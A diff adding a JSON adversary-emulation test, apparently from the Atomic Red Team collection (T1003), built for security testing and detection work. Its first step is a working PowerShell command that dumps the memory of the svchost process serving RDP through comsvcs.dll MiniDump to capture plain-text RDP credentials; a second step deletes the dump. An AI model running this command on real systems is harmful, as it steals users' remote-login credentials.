@@ -1,0 +1,44 @@
+{
+  "id": "d400090a-d8ca-4be0-982e-c70598a23de9",
+  "name": "Dump svchost.exe to gather RDP credentials",
+  "description": "The svchost.exe contains the RDP plain-text credentials.\nSource: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n\nUpon successful execution, you should see the following file created $env:TEMP\\svchost-exe.dmp.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "dd3bfc41-1c40-4796-8c9c-56b495e35f71",
+      "type": "execute-command",
+      "data": {
+        "command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5a79813c-6671-458b-8f6f-dd001f5a2279",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item $env:TEMP\\svchost-exe.dmp -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "dd3bfc41-1c40-4796-8c9c-56b495e35f71",
+      "p": "on-success",
+      "o": "5a79813c-6671-458b-8f6f-dd001f5a2279"
+    },
+    {
+      "s": "dd3bfc41-1c40-4796-8c9c-56b495e35f71",
+      "p": "on-failure",
+      "o": "5a79813c-6671-458b-8f6f-dd001f5a2279"
+    }
+  ],
+  "tags": [
+    "T1003",
+    "atomic-red-team"
+  ]
+}
